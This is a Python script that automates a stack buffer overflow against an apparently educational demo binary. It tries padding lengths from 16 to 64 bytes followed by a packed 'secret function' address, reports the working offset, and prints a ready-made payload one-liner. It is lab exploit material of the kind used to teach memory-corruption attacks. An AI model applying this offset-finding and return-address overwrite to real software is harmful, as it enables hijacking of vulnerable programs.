#!/usr/bin/env python3
"""
Tool to find the correct offset for buffer overflow exploit
This script systematically tests different offsets to find which one works
"""

import subprocess
import struct
import sys

def get_secret_function_address():
    """Extract the secret function address from program output"""
    try:
        result = subprocess.run(
            ['./buffer_overflow_demo'],
            input='\n',
            capture_output=True,
            text=True,
            timeout=2
        )
        output = result.stdout + result.stderr
        for line in output.split('\n'):
            if 'Secret function address:' in line:
                addr_str = line.split()[-1]
                return int(addr_str, 16)
        return None
    except Exception as e:
        print(f"Error: {e}")
        return None

def test_offset(secret_addr, offset):
    """Test a specific offset"""
    try:
        # Create payload: padding + address
        payload = b'A' * offset
        payload += struct.pack('<Q', secret_addr)
        
        # Send to program
        result = subprocess.run(
            ['./buffer_overflow_demo'],
            input=payload,
            capture_output=True,
            text=False,
            timeout=2
        )
        
        # Decode output
        output = (result.stdout + result.stderr).decode('utf-8', errors='ignore')
        
        # Check if secret function was called
        if 'SECRET FUNCTION ACTIVATED' in output:
            return True, output, None
        elif result.returncode != 0:
            # Program crashed - might be close but wrong alignment
            return False, output, f"Exit code: {result.returncode}"
        else:
            return False, output, "Completed normally (offset too small or wrong)"
    
    except subprocess.TimeoutExpired:
        return False, "", "Timeout"
    except Exception as e:
        return False, "", f"Error: {e}"

def main():
    print("=" * 60)
    print("Buffer Overflow Offset Finder")
    print("=" * 60)
    print()
    
    # Get secret function address
    print("Step 1: Getting secret function address...")
    secret_addr = get_secret_function_address()
    
    if secret_addr is None:
        print("ERROR: Could not extract secret function address")
        print("Make sure buffer_overflow_demo is compiled and in current directory")
        sys.exit(1)
    
    print(f"✓ Found: 0x{secret_addr:x}")
    print()
    
    # Test different offsets
    print("Step 2: Testing different offsets...")
    print("This may take a moment...\n")
    
    # Common offsets to try (in bytes)
    offsets_to_test = list(range(16, 65, 1))  # Test every byte from 16 to 64
    
    found = False
    successful_offsets = []
    
    for offset in offsets_to_test:
        print(f"Testing offset {offset:2d} bytes...", end=' ', flush=True)
        success, output, error = test_offset(secret_addr, offset)
        
        if success:
            print("✓ SUCCESS!")
            successful_offsets.append(offset)
            found = True
            print("\n" + "=" * 60)
            print("EXPLOIT SUCCESSFUL!")
            print("=" * 60)
            print(f"\nWorking offset: {offset} bytes")
            print(f"\nPayload command:")
            print(f"python3 -c \"import struct,sys; sys.stdout.buffer.write(b'A'*{offset} + struct.pack('<Q', 0x{secret_addr:x}))\" | ./buffer_overflow_demo")
            print(f"\nOr use this Python code:")
            print(f"payload = b'A' * {offset}")
            print(f"payload += struct.pack('<Q', 0x{secret_addr:x})")
            print("\nOutput:")
            print("-" * 60)
            # Show relevant part of output
            for line in output.split('\n'):
                if 'SECRET FUNCTION' in line or '╔' in line or '║' in line or '╚' in line:
                    print(line)
            print("-" * 60)
            print()
            break
        else:
            if "Exit code" in str(error):
                print("✗ Crash (might be close)")
            else:
                print("✗ No")
    
    if not found:
        print("\n" + "=" * 60)
        print("Could not find working offset automatically.")
        print("=" * 60)
        print("\nPossible reasons:")
        print("1. Stack protection is enabled (recompile with -fno-stack-protector)")
        print("2. ASLR is randomizing addresses (address changes between runs)")
        print("3. Stack alignment is different than expected")
        print("\nTry manually:")
        print(f"1. Run: ./buffer_overflow_demo")
        print(f"2. Note the secret function address")
        print(f"3. Try offsets: 24, 32, 40, 48, 56")
        print(f"4. Use: python3 -c \"import struct,sys; sys.stdout.buffer.write(b'A'*OFFSET + struct.pack('<Q', ADDRESS))\" | ./buffer_overflow_demo")
    
    elif len(successful_offsets) > 0:
        print(f"\nFound {len(successful_offsets)} working offset(s): {successful_offsets}")

if __name__ == '__main__':
    main()

